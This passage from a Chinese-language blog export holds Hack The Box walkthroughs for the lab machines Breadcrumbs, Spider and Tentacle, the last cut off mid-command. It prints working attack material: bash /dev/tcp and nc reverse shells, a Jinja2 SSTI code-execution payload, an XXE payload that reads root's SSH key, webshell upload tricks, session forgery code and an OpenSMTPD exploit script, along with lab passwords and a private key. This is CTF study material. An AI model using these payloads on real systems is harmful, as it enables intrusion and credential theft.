$max = strlen($username) - 1;\\r\\n $seed = rand(0, $max);\\r\\n $key = \\\"s4lTy_stR1nG_\\\".$username[$seed].\\\"(!528.\\/9890\\\";\\r\\n $session_cookie = $username.md5($key);\\r\\n\\r\\n return $session_cookie;\\r\\n}\"\n```\n暂时到这线索就断了，咱们去看看portal目录下还有啥吧\n\n![](Hackthebox-Breadcrumbs/a91f8d84-1038-4fd1-b7a4-642a483a8180.png)\n\n该目录下有一个files.php文件，咱们查看一下\n\n![](Hackthebox-Breadcrumbs/5d1e5788-3ae4-4edf-8596-9bc5a84b3eee.png)\n\n不出意外的话，files的用户应该是paul了\n\n去JWT.io创建一个令牌\n\n```cpp\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU\n```\n咱们去登录\n\n![](Hackthebox-Breadcrumbs/1c27ba84-3462-495e-9ce4-3867f9f4ac53.png)\n\n随便注册一个账号，然后登录，然后替换JWT令牌\n\n```cpp\n<?php\n$username = \"paul\";\n$max = strlen($username) -1;\n$seed = rand(0, $max);\n$key = \"s4lTy_stR1nG_\".$username[$seed].\"(!528./9890\";\n$session_cookie = $username.md5($key);\necho $session_cookie;\n?>\n```\n使用该脚本获取session进行替换\n\n```cpp\nfor i in {0..5};do php session.php;echo '';sleep 1;done\n```\n![](Hackthebox-Breadcrumbs/35ce4295-a80f-44d4-80c4-864ad0172bfa.png)\n\n![](Hackthebox-Breadcrumbs/a31640c3-37a8-4034-96f4-09e82c28a072.png)\n\n成功登录为paul账户\n\nFile management似乎只允许.zip格式的文件\n\n咱们上传一个phpshell\n\n> https://github.com/LucifielHack/p0wny-shell\n\n![](Hackthebox-Breadcrumbs/ff713ca2-8b56-4f81-a701-d529027a2219.png)\n\n上传的时候 会自动在末尾添加上.zip\n\n咱们在最末尾再手动添加一个.php即可绕过\n\n这只是个前端验证\n\n![](Hackthebox-Breadcrumbs/fd0780be-9f1a-4f5b-be25-9a4431f2d1e8.png)\n\n成功拿到一个phpshell\n\n此处有两个方法得到一个shell\n\n## 方法一：\n查看C:\\\\Users\\\\www-data\\\\Desktop\\\\xampp\\\\htdocs\\\\portal\\\\pizzaDeliveryUserData目录下的juliette.json文件，即可得到一个账号密码，进行SSH登录\n\n```cpp\ntype juliette.json\n\nusername = juliette\npassword = jUli901./())!\n```\n## 方法二：\n本地使用python3搭建一个http服务器，在phpshell内使用curl进行下载nc.exe，然后使用nc进行shell反弹\n\n本机运行\n\n```cpp\npython3 -m http.server 80\nnc -nvlp 4444\nphpshell运行\ncurl [http://localhost/nc.exe -o nc.exe](http://localhost/nc.exe%20-o%20nc.exe)\nnc.exe localhost 4444 -e cmd.exe\n```\n这里看大家自己喜欢什么方式了\n\n![](Hackthebox-Breadcrumbs/7abb2910-c2e7-45bf-b3cc-7f8fd1c28113.png)\n\n成功获得users权限的flag\n\n# **权限提升**\n![](Hackthebox-Breadcrumbs/68b774bf-97a6-4448-bab6-34b94f75d3fd.png)\n\n咱们查看一下桌面上todo.html的内容\n\n它声明它将密码存储在名为 Microsoft Store Sticky Notes 的程序中\n\n咱们找过去\n\n参考链接\n\n> [https://www.thewindowsclub.com/where-are-sticky-notes-saved-in-windows-10](https://www.thewindowsclub.com/where-are-sticky-notes-saved-in-windows-10)\n\n```cpp\ncd C:\\Users\\juliette\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\n```\n![](Hackthebox-Breadcrumbs/2606c3a6-0297-46e8-98a3-3cb4fba09389.png)\n\n现在我们要把sqlite文件搞下来\n\n这里什么smb共享啊 nc传输啊 或是其他方式的，很多方法，我就不演示了，大家用自己喜欢的方法搞吧。搞下来后，在自己电脑上也要放在同一位置，然后进行查看\n\n```cpp\njuliette: jUli901./())!\ndevelopment: fN3)sN5Ee@g\nadministrator: [MOVED]\n```\n这是咱们得到的内容，也就是密码\n\n咱们使用ssh登录development这个账户\n\n![](Hackthebox-Breadcrumbs/06357381-0eaa-41fe-8895-383c003acab2.png)\n\n![](Hackthebox-Breadcrumbs/cd414f8b-3e49-4881-af68-6b260168a15c.png)\n\n咱们检查一下krypter\\_linux\n\n咱们用上面相同的放式给搞下来，然后查看\n\n![](Hackthebox-Breadcrumbs/3581de3d-b044-4746-8c53-73d5e1281246.png)\n\n我们可以看到目标机器位于1234端口\n\n搞他\n\n咱们使用ssh做一个动态端口转发\n\n```cpp\nssh -L 1234:127.0.0.1:1234 [development@10.10.10.228](mailto:development@10.10.10.228)\n```\n然后让我们访问一下这个页面\n\n```cpp\ncurl 'http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords'\n```\n![](Hackthebox-Breadcrumbs/d895b412-e2e4-4dc1-b88c-43eace3df37b.png)\n\n我们得到了一个aes密钥k19D193j.<19391(\n\n我们使用sqlmap进行注入\n\n```cpp\nsqlmap -u http://127.0.0.1:1234/index.php\\?method\\=select\\&username\\=administrator\\&table\\=passwords --dump\n```\n![](Hackthebox-Breadcrumbs/377d42bf-dcc5-4f83-9393-0d2875648319.png)\n\n```cpp\naccount = Administrator\naes_key = k19D193j.<19391(\npassword = H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=\n```\n使用在线工具进行解密\n\n> [https://www.devglan.com/online-tools/aes-encryption-decryption](https://www.devglan.com/online-tools/aes-encryption-decryption)\n\n![](Hackthebox-Breadcrumbs/7f8b6af4-c154-4bf2-99a3-a781a3973a0f.png)\n\n```cpp\ncEBzc3cwcmQhQCMkOTg5MC4v\n```\n我们使用base64进行解密\n\n![](Hackthebox-Breadcrumbs/396206c5-a50b-4645-b5d4-d7194941a1fc.png)\n\n```cpp\n[p@ssw0rd!@#$9890./](mailto:p@ssw0rd!@#$9890./)\n```\n使用ssh登录administrator账户即可\n\n![](Hackthebox-Breadcrumbs/9b416034-80f1-4f68-95ac-13f9e7de4434.png)\n\n提权administrator成功\n\n![](Hackthebox-Breadcrumbs/8430ab0c-c686-43ef-b095-587aa0730a73.png)\n\n成功拿到root权限的flag\n\n收工吃夜宵","tags":["Hackthebox"]},{"title":"Spider - Hackthebox","url":"/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/","content":"\n# Hackthebox - Spider\n**靶场信息**\n\n![](Hackthebox-Spider/bc3a1e99-fb8a-4f92-9b33-ccc48ef886c3.png)\n\n**靶场类型**\n\n![](Hackthebox-Spider/f6acdc5b-7a37-4d88-8fca-330091eff548.png)\n\n**信息搜集**\n\n使用nmap进行端口扫描\n\n```\nnmap -A -sS -sV -sC 10.10.10.243\n```\n\n![](Hackthebox-Spider/a883c068-7413-4bed-ae09-6da01098c91f.png)\n\n我们可以看到，存在22和80端口，咱们访问一下80端口\n\n![](Hackthebox-Spider/17240d54-3a90-4ec6-b89a-67a9b6c73b1f.png)\n\n会被重定向到spider.htb，咱们先把它加入hosts文件吧\n\n```\necho 10.10.10.243 spider.htb > /etc/hosts\n```\n\n![](Hackthebox-Spider/c0a054e4-7f1a-4166-b6d2-86d6ba76cea9.png)\n\n再访问可以发现是一个家具页面，咱们做一下信息搜集\n\n```\ngobuster dir -u http://spider.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50\n```\n\n![](Hackthebox-Spider/eea7666e-c72a-40f1-940f-c686b73917f9.png)\n\n```\n/cart (Status: 500) \\[Size: 290\\]\n/checkout (Status: 500) \\[Size: 290\\]\n/index (Status: 200) \\[Size: 11273\\]\n/login (Status: 200) \\[Size: 1832\\]\n/logout (Status: 302) \\[Size: 209\\] \\[--> http://spider.htb/\\]\n/main (Status: 302) \\[Size: 219\\] \\[--> http://spider.htb/login\\]\n/register (Status: 200) \\[Size: 2130\\]\n/user (Status: 302) \\[Size: 219\\] \\[--> http://spider.htb/login\\]\n/view (Status: 302) \\[Size: 219\\] \\[--> [http://spider.htb/login](http://spider.htb/login)\\]\n```\n\n我们可以看到，能访问的只有注册页面和登录页面，咱们先去看看注册页面\n\n![](Hackthebox-Spider/9b5915ec-5ceb-4a12-afb0-693bb773bcd5.png)\n\n咱们注册一个用户\n\n![](Hackthebox-Spider/fda6ccca-b9e4-415d-b50a-804ac10c7cd3.png)\n\n```\n7443d68c-02b2-428c-b622-af15604cd905\n```\n\n咱们得到了一段UUID，使用密码登录试试\n\n![](Hackthebox-Spider/5994df2b-3b30-48c5-9ce2-f6e71dcb5a91.png)\n\n登录后似乎也只有这个页面可以点击，咱们再多看看\n\n在做信息搜集的时候，突然醒悟过来，这会不会是个SSTI？咱们测试一下\n\n![](Hackthebox-Spider/708b8be6-9466-494c-b73d-26f5094de36b.png)\n\n咱们测试一下\n\n![](Hackthebox-Spider/c518d2b5-98a6-4d03-9553-c638226ae439.png)\n\n登陆后查看一下我们的账户信息\n\n![](Hackthebox-Spider/179c86cf-a77b-4d73-b55f-a9c61a9a5b0d.png)\n\n好家伙，确实是\n\n这里可以进行SSTI攻击，那么意味着服务器正在运行Jinja2或者Flask，这里是Flask\n\n**漏洞利用**\n\n这里我们查看一下config信息，注册一个{{config}}用户\n\n![](Hackthebox-Spider/82db4e28-cc7f-4aa3-a8f7-0fe7812eb486.png)\n\n![](Hackthebox-Spider/8ea66433-79fb-4559-a243-2876806263e4.png)\n\n```\n<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE\\_EXCEPTIONS': None, 'PRESERVE\\_CONTEXT\\_ON\\_EXCEPTION': None, 'SECRET\\_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942', 'PERMANENT\\_SESSION\\_LIFETIME': datetime.timedelta(31), 'USE\\_X\\_SENDFILE': False, 'SERVER\\_NAME': None, 'APPLICATION\\_ROOT': '/', 'SESSION\\_COOKIE\\_NAME': 'session', 'SESSION\\_COOKIE\\_DOMAIN': False, 'SESSION\\_COOKIE\\_PATH': None, 'SESSION\\_COOKIE\\_HTTPONLY': True, 'SESSION\\_COOKIE\\_SECURE': False, 'SESSION\\_COOKIE\\_SAMESITE': None, 'SESSION\\_REFRESH\\_EACH\\_REQUEST': True, 'MAX\\_CONTENT\\_LENGTH': None, 'SEND\\_FILE\\_MAX\\_AGE\\_DEFAULT': datetime.timedelta(0, 43200), 'TRAP\\_BAD\\_REQUEST\\_ERRORS': None, 'TRAP\\_HTTP\\_EXCEPTIONS': False, 'EXPLAIN\\_TEMPLATE\\_LOADING': False, 'PREFERRED\\_URL\\_SCHEME': 'http', 'JSON\\_AS\\_ASCII': True, 'JSON\\_SORT\\_KEYS': True, 'JSONIFY\\_PRETTYPRINT\\_REGULAR': False, 'JSONIFY\\_MIMETYPE': 'application/json', 'TEMPLATES\\_AUTO\\_RELOAD': None, 'MAX\\_COOKIE\\_SIZE': 4093, 'RATELIMIT\\_ENABLED': True, 'RATELIMIT\\_DEFAULTS\\_PER\\_METHOD': False, 'RATELIMIT\\_SWALLOW\\_ERRORS': False, 'RATELIMIT\\_HEADERS\\_ENABLED': False, 'RATELIMIT\\_STORAGE\\_URL': 'memory://', 'RATELIMIT\\_STRATEGY': 'fixed-window', 'RATELIMIT\\_HEADER\\_RESET': 'X-RateLimit-Reset', 'RATELIMIT\\_HEADER\\_REMAINING': 'X-RateLimit-Remaining', 'RATELIMIT\\_HEADER\\_LIMIT': 'X-RateLimit-Limit', 'RATELIMIT\\_HEADER\\_RETRY\\_AFTER': 'Retry-After', 'UPLOAD\\_FOLDER': 'static/uploads'}>\n```\n\n我们得到了相关的配置信息\n\n我们筛选一下其中的关键信息\n\n```\nsecret\\_key = Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942\n```\n\n首先安装一下咱们需要的模块\n\npip3 install flask\\_unsign\n\n然后咱们使用sqlmap的eval处理session参数\n\n```\nsqlmap http://spider.htb/ --eval \"from flask\\_unsign import session as s; session = s.sign({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')\" --cookie=\"session=\\*\" --delay 1 --dump\n```\n\n第一个选项输入Y，后面的都输入N\n\n![](Hackthebox-Spider/1b5dd0b8-961a-4081-9f24-4272a4191241.png)\n\n成功得到uuid和password\n\n```\nuuid = 129f60ea-30cf-4065-afb9-6be45ad38b73\npassword = ch1VW4sHERE7331\n```\n\n咱们去登录\n\n![](Hackthebox-Spider/81fc7cdb-8b81-4bfa-bcc6-0dee6017b0d0.png)\n\n啊哈，这次出现不一样的界面了\n\n![](Hackthebox-Spider/873f3e1d-ecf8-4e32-99f8-2fbc15a8f3fe.png)\n\n让我们去检查一下messages\n\n![](Hackthebox-Spider/b3470c7e-f903-4ade-9d15-a2b309dcc531.png)\n\n```\n/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal\n```\n\n咱们得到了一个链接，去访问一下\n\n[http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal](http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal)\n\n![](Hackthebox-Spider/0f35ef84-d78e-4c5c-8872-ffe206f2a287.png)\n\n首先让我们构造payload\n\n```\nbash -c 'exec bash -i &>/dev/tcp/10.10.14.54/4444 <&1'\n```\n\n然后转化为base64格式\n\n```\nYmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTQvNDQ0NCA8JjEn\n```\n\n然后构造poc\n\n```\n{% with a = request\\[\"application\"\\]\\[\"\\\\x5f\\\\x5fglobals\\\\x5f\\\\x5f\"\\]\\[\"\\\\x5f\\\\x5fbuiltins\\\\x5f\\\\x5f\"\\][\"\\\\x5f\\\\x5fimport\\\\x5f\\\\x5f\"](\"os\")[\"popen\"](\"echo -n YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTQvNDQ0NCA8JjEn | base64 -d | bash\")\\[\"read\"\\]() %} a {% endwith %}\n```\n\n然后本地监听一个端口\n\n```\nnc -nvlp 4444\n```\n\n![](Hackthebox-Spider/f79a09de-9ce2-49c3-9bdd-1883f5c634cf.png)\n\n![](Hackthebox-Spider/35f02974-11cd-4104-a425-7098b6a3bddf.png)\n\n成功getshell\n\n![](Hackthebox-Spider/aa0b7469-fe6b-4080-9943-eb7807d0a19d.png)\n\n成功拿到user权限的flag\n\n**权限提升**\n\n![](Hackthebox-Spider/f68c197d-856d-42a9-9f31-b7f1d528dbe9.png)\n\n我们可以看到/home/chiv目录下存在.ssh目录，那应该是存在密钥的，咱们进去看看\n\n![](Hackthebox-Spider/46c68b8a-cd88-41c9-8f01-351ee9706404.png)\n\n成功拿到私钥\n\n```\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV\ngjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS\nU7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9\nMI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7\nBLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2\nVTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu\n6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs\nhx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl\nZ5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc\nXVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq\n54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy\nf0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62\nnKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL\nj0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO\nJjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW\nK1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv\nhm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ\nmQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8\ngu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb\n0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2\nnfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W\nCeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG\nrbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO\nTTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6\nIleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==\n-----END RSA PRIVATE KEY-----\n```\n\n保存到本地\n\n使用ssh进行登录\n\n![](Hackthebox-Spider/4e24d428-5099-4dd1-9973-948c7826023b.png)\n\n登录成功\n\n查看一下正在运行的端口\n\n```\nss -tupln\n```\n\n![](Hackthebox-Spider/f9981509-39d4-4c44-bc42-e6e942df9bae.png)\n\n咱们发现本地运行着8080端口\n\n咱们需要把端口转发出来\n\n```\nssh -i id\\_chiv -L 8080:localhost:8080 chiv@spider.htb\n```\n\n然后咱们打开firefox进行访问[http://127.0.0.1:8080/](http://127.0.0.1:8080/)\n\n![](Hackthebox-Spider/1ab2a0c4-e8c9-40cc-a0df-5b6e31eff10b.png)\n\n端口转发成功\n\n![](Hackthebox-Spider/cb10a2af-685b-41d0-a42f-5fc5d7a16f89.png)\n\n这边随便一个账户都可以登录\n\n![](Hackthebox-Spider/a05250c6-2ecb-4d90-a13d-ce02a299c18a.png)\n\n咱们查看一下cookie，这里cookie需要解密\n\n```\n.eJw1jE1PwyAAhv-K4eyB1u3SZJcKtHZChfLRcbNhCa3Q1clhbtl\\_d9N4fPM8z3sB4RQDKC7gYQAFUJgRh0-SfzRamDTrmJm9od9Dbcd3RVayWkqnMsR7QTUSrwr7rYsvZ9UldONzp1jZkqUWU2nv\\_L4tDIgb13CIV5b4dqhYYsaPOlNHqUWzDyVqJZlosOtdzCpHFsVwuvl\\_f7-99N7gdTTada4iPXtOTNQu32nf2hB6NQuvz\\_zI8\\_DvUxqag8WObCH7dE92GmTILebwjW824PoIlsM4py9QwOsPiZ9VQg.YMsGpQ.L71-NNdbcE09uMjZzZWHHG-Zytw\n```\n\n使用flask-unsign进行解码\n\n```\nflask-unsign --decode --cookie .eJw1jE1PwyAAhv-K4eyB1u3SZJcKtHZChfLRcbNhCa3Q1clhbtl\\_d9N4fPM8z3sB4RQDKC7gYQAFUJgRh0-SfzRamDTrmJm9od9Dbcd3RVayWkqnMsR7QTUSrwr7rYsvZ9UldONzp1jZkqUWU2nv\\_L4tDIgb13CIV5b4dqhYYsaPOlNHqUWzDyVqJZlosOtdzCpHFsVwuvl\\_f7-99N7gdTTada4iPXtOTNQu32nf2hB6NQuvz\\_zI8\\_DvUxqag8WObCH7dE92GmTILebwjW824PoIlsM4py9QwOsPiZ9VQg.YMsGpQ.L71-NNdbcE09uMjZzZWHHG-Zytw\n```\n\n返回了一段base64码\n\n```\n{'lxml': b'PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+MTIzPC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4=', 'points': 0}\n```\n\n咱们解密一下\n\n![](Hackthebox-Spider/714b09f4-e1bb-40c4-b75b-262fb14c92fd.png)\n\n咱们查看源代码\n\n![](Hackthebox-Spider/f43ce31d-0dce-46dd-aaa9-c12f91ffe119.png)\n\n我们在登录页面的源代码中可以看到有一个hidden值，所以咱们可以利用XXE攻击\n\n参考链接\n\n> [https://github.com/LucifielHack/PayloadsAllTheThings/tree/master/XXE%20Injection](https://github.com/LucifielHack/PayloadsAllTheThings/tree/master/XXE%20Injection)\n\n咱们构造一个poc\n\n```\nusername=%26username%3b&version=1.0.0--><!DOCTYPE+foo+\\[<!ENTITY+username+SYSTEM+\"/root/.ssh/id\\_rsa\">+\\]><!--\n```\n\n然后使用burp抓个包\n\n然后咱们加入构造的poc\n\n![](Hackthebox-Spider/5792fa2c-bb02-4b45-a82f-d99dd0a681a1.png)\n\n![](Hackthebox-Spider/bab9f47c-5225-4a79-a8c4-7c4a92a22020.png)\n\n![](Hackthebox-Spider/f989eb92-b70d-4f9e-b98e-077dc08aa466.png)\n\n成功获得root用户的密钥\n\n咱们保存到本地 使用密钥进行登录\n\n![](Hackthebox-Spider/83e5d54e-8dd5-4924-a717-c18d37fc3ea2.png)\n\n成功登录root权限\n\n![](Hackthebox-Spider/d47f85a6-e834-4d86-9ed0-b6a751df3c7b.png)\n\n成功拿到root权限的flag","tags":["Hackthebox"]},{"title":"Tentacle - Hackthebox","url":"/2021/06/16/Hackthebox/Hard/Hackthebox-Tentacle/","content":"\n# Hackthebox - Tentacle\n**靶场信息**\n\n![](Hackthebox-Tentacle/dd553def-8ccf-4f8d-a192-6dada7287ee2.png)\n\n**靶场类型**\n\n![](Hackthebox-Tentacle/16877a67-dd27-4220-a9d2-0e3bd0ffe700.png)\n\n信息搜集\n\n使用nmap进行端口扫描\n\nnmap -A -sS -sC -sV 10.10.10.224\n\n![](Hackthebox-Tentacle/4998f833-19d7-412e-9162-c879ea7132d8.png)\n\n我们可以看到，开启了22、53、88、3128、9090几个端口\n\n首先让我们看看3128端口吧，这个端口是Squid代理的默认端口，我也是第一次遇到，比较感兴趣\n\n![](Hackthebox-Tentacle/47abfa67-0cc4-4e56-afc5-ca6331045ae1.png)\n\n这里报错了，但是给出了一个域名realcorp.htb\n\n经过测试，该域名的用法是使用这个域名来进行子域名枚举，这里使用dnsenum进行枚举\n\ndnsenum --threads 64 --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt realcorp.htb\n\n![](Hackthebox-Tentacle/13bc0799-07f8-48b3-afb0-9b97c320959c.png)\n\nns.realcorp.htb. 259200 IN A 10.197.243.77\n\nproxy.realcorp.htb. 259200 IN CNAME ns.realcorp.htb.\n\nns.realcorp.htb. 259200 IN A 10.197.243.77\n\nwpad.realcorp.htb. 259200 IN A 10.197.243.31\n\n我们得到了几个域，但是无法直接访问，所以我们使用proxychains4来枚举它\n\n先让我们编辑一下代理配置文件/etc/proxychains.conf\n\necho \"\\[ProxyList\\]\\\\nhttp 10.10.10.224 3128\\\\nhttp 127.0.0.1 3128\\\\nhttp 10.197.243.77 3128\" > /etc/proxychains.conf\n\n![](Hackthebox-Tentacle/28ac6333-75e6-43ea-b787-631fa379b5b4.png)\n\n设置好以后，使用nmap进行扫描\n\nproxychains -f /etc/proxychains.conf nmap -sT -Pn 10.197.243.31\n\n![](Hackthebox-Tentacle/9a2a412c-b84e-489e-a65b-9b241886ae4c.png)\n\n经过非常漫长的等待以后，咱们发现开启了这几个端口\n\n我们可以看到，有一个80端口开着，咱们通过代理去访问看看\n\nproxychains firefox wpad.realcorp.htb\n\n![](Hackthebox-Tentacle/9d3a9fb7-3097-4b75-aa62-08b6505df4c5.png)\n\n无法被访问\n\n咱们添加一个本地解析\n\necho 10.197.243.31 wpad.realcorp.htb > /etc/hosts\n\n![](Hackthebox-Tentacle/47a3aad3-68b8-430b-9e96-73f5814c8941.png)\n\n再次访问就提示403了，咱们做一个信息搜集看看\n\nproxychains dirb [http://wpad.realcorp.htb/](http://wpad.realcorp.htb/)\n\n经过漫长的等待后，并没有获得什么有用的信息。\n\n然后我把着眼点放到了子域名上\n\nwpad，我去google了一下\n\n发现有一个wpad.dat的文件，咱们去试试能不能下载下来\n\nproxychains firefox [http://wpad.realcorp.htb/wpad.dat](http://wpad.realcorp.htb/wpad.dat)\n\n![](Hackthebox-Tentacle/01b4ca16-4eb6-445e-ac6b-beda94744b6b.png)\n\nOK 存在这个文件，并且可以下载\n\n![](Hackthebox-Tentacle/2a4517a2-7e62-45d5-a716-1204b7fbd61b.png)\n\nWPAD协议分析及内网渗透利用\n\n[https://xz.aliyun.com/t/1739#toc-9](https://xz.aliyun.com/t/1739#toc-9)\n\n在我自己测试的时候，第一个段10.197.243.0/24这个IP段，咱们可以跳过\n\n在扫描第二个IP段10.241.251.0/24的时候，经过了大量的信息搜集，发现10.241.251.113开启了smtp端口，因为我已经做过一次了，就不做重复用工，直接扫描113这台机器\n\nproxychains -f /etc/proxychains.conf nmap -sT -sV -Pn 10.241.251.113\n\n![](Hackthebox-Tentacle/e4c6f6ba-9d9a-446c-b965-476760d55caa.png)\n\n我们可以看到，113这台机器开启了25端口，也就是smtp服务\n\n**漏洞利用**\n\n可以看到这里使用的是OpenSMTPD，咱们去搜索一下相关的漏洞\n\n![](Hackthebox-Tentacle/c6cab9b3-2a6d-4059-b495-6e8130ae7e81.png)\n\n咱们找到了一个CVE-2020-7247\n\n[https://www.exploit-db.com/exploits/47984](https://www.exploit-db.com/exploits/47984)\n\n咱们简单修改一下Exploit\n\n#!/usr/bin/env python3\n\nimport socket, time\n\nimport sys\n\nif len(sys.argv) < 4:\n\nprint(\"usage: exploit.py   \")\n\nexit()\n\nHOST = sys.argv\\[1\\]\n\nPORT = int(sys.argv\\[2\\])\n\nrev\\_shell\\_cmd = sys.argv\\[3\\]\n\npayload = b\"\"\"\\\\r\\\\n\n\n#0\\\\r\\\\n\n\n#1\\\\r\\\\n\n\n#2\\\\r\\\\n\n\n#3\\\\r\\\\n\n\n#4\\\\r\\\\n\n\n#5\\\\r\\\\n\n\n#6\\\\r\\\\n\n\n#7\\\\r\\\\n\n\n#8\\\\r\\\\n\n\n#9\\\\r\\\\n\n\n#a\\\\r\\\\n\n\n#b\\\\r\\\\n\n\n#c\\\\r\\\\n\n\n#d\\\\r\\\\n\n\n\"\"\" + rev\\_shell\\_cmd.encode() + b\"\"\"\n\n.\n\n\"\"\"\n\nfor res in socket.getaddrinfo(HOST, PORT, socket.AF\\_UNSPEC, socket.SOCK\\_STREAM):\n\naf, socktype, proto, canonname, sa = res\n\ntry:\n\ns = socket.socket(af, socktype, proto)\n\nexcept OSError as msg:\n\ns = None\n\ncontinue\n\ntry:\n\ns.connect(sa)\n\nexcept OSError as msg:\n\ns.close()\n\ns = None\n\ncontinue\n\nbreak\n\nif s is None:\n\nprint(\"Could not open socket\")\n\nsys.exit(1)\n\nwith s:\n\ndata = s.recv(1024)\n\nprint('Received', repr(data))\n\ntime.sleep(1)\n\nprint('SENDING HELO')\n\ns.send(b\"helo test.com\\\\r\\\\n\")\n\ndata = s.recv(1024)\n\nprint('RECIEVED', repr(data))\n\ns.send(b\"MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>\\\\r\\\\n\")\n\ntime.sleep(1)\n\ndata = s.recv(1024)\n\nprint('RECIEVED', repr(data))\n\ns.send(b\"RCPT TO:[j.nakazawa@realcorp.htb](mailto:&#106;&#46;&#x6e;&#x61;&#x6b;&#97;&#x7a;&#97;&#119;&#97;&#64;&#x72;&#101;&#97;&#x6c;&#x63;&#111;&#114;&#112;&#x2e;&#x68;&#x74;&#98;)\\\\r\\\\n\")\n\ndata = s.recv(1024)\n\nprint('RECIEVED', repr(data))\n\ns.send(b\"DATA\\\\r\\\\n\")\n\ndata = s.recv(1024)\n\nprint('RECIEVED', repr(data))\n\ns.send(payload)\n\ndata = s.recv(1024)\n\nprint('RECIEVED', repr(data))\n\ns.send(b\"QUIT\\\\r\\\\n\")\n\ndata = s.recv(1024)\n\nprint('RECIEVED', repr(data))\n\nprint(\"Exploited\")\n\ns.close()\n\n保存为exploit.py后，本地使用nc开启一个端口监听\n\nnc -nvlp 4444\n\n使用proxychains4代理运行该脚本\n\nproxychains4 python3 expliot.py 10.241.251.113 25 'bash -c \"exec bash -i &> /dev/tcp/10.10.14.2/4444 